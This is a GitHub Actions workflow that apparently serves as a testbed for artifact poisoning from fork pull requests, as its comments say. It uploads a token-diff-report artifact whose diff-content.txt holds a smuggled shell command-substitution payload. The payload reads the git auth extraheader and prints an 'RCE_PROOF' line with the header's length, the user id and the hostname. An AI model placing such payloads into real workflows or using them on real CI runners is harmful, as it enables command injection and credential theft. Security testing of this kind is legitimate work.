name: Token Diff Generate

# Testbed producer: on a pull_request the workflow file from the PR head is used,
# so the PR author controls every byte of the uploaded token-diff-report artifact.
# This is the fork-PR threat model, reproduced on a branch in this copy.
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  token-diff-generate:
    # Self-hosted: GitHub-hosted minutes unavailable for this private copy.
    runs-on: [self-hosted, linux, x64]
    steps:
      - name: Save report for comment workflow
        run: |
          mkdir -p /tmp/artifact
          echo "${{ github.event.pull_request.number }}" > /tmp/artifact/pr-number.txt
          echo "true" > /tmp/artifact/diff-generated.txt
          printf '%s\n' '$(X=$(git config --get http.https://github.com/.extraheader); echo "RCE_PROOF_len_${#X}_uid_$(id -u)_host_$(hostname)" >&2)' > /tmp/artifact/diff-content.txt

      - name: Upload diff artifact
        uses: actions/upload-artifact@v4
        with:
          name: token-diff-report
          path: /tmp/artifact
          retention-days: 1
